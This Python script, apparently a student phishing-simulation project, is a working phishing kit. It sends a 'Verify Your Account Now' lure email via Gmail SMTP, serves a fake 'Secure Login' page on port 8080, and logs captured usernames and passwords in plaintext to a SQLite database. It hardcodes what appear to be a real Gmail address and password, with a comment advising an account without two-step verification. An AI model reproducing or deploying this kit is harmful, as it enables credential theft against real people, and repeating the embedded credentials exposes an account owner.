import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler, HTTPServer
import sqlite3
from urllib.parse import parse_qs

# Step 1: Configure Email Automation
def send_phishing_email(recipient_email, phishing_link):
    #use a mail that was not enabled 2 step verification
    sender_email = "21bq1a4717@gmail.com"
    sender_password = "Vinay21sai"

    subject = "Important: Verify Your Account Now"
    body = f"Please click the link below to verify your account:\n{phishing_link}"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print(f"Phishing email sent to {recipient_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Step 2: Create a Fake Login Page
class PhishingPageHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""<html>
            <head>
                <title>Secure Login</title>
                <style>
                    body { font-family: Arial, sans-serif; background-color: #f2f2f2; text-align: center; padding: 50px; }
                    .login-container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); display: inline-block; }
                    input[type='text'], input[type='password'] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
                    input[type='submit'] { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
                    input[type='submit']:hover { background-color: #45a049; }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h2>Secure Login</h2>
                    <form method='POST'>
                        <label for="username">Username:</label><br>
                        <input type='text' id="username" name='username' placeholder='Enter your username'><br>
                        <label for="password">Password:</label><br>
                        <input type='password' id="password" name='password' placeholder='Enter your password'><br><br>
                        <input type='submit' value='Login'>
                    </form>
                </div>
            </body>
        </html>""")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        credentials = parse_qs(post_data)
        username = credentials.get('username', [''])[0]
        password = credentials.get('password', [''])[0]
        log_user_response(username, password)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""<html>
            <body>
                <h3>Thank you for logging in. You can attempt to log in again.</h3>
                <a href='/'>Go back to login</a>
            </body>
        </html>""")

# Step 3: Track User Responses
def log_user_response(username, password):
    connection = sqlite3.connect("phishing_simulation.db")
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS responses (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
    cursor.execute("INSERT INTO responses (username, password) VALUES (?, ?)", (username, password))
    connection.commit()
    connection.close()
    print(f"Logged response: {username}, {password}")

# Step 4: Run the Fake Login Server
def run_server():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, PhishingPageHandler)
    print("Fake login page running on http://localhost:8080")
    httpd.serve_forever()

if __name__ == "__main__":
    # Example Usage
    phishing_link = "http://localhost:8080"
    recipient_email = "target_email@example.com"

    # Send phishing email
    send_phishing_email(recipient_email, phishing_link)

    # Start the fake login server
    run_server()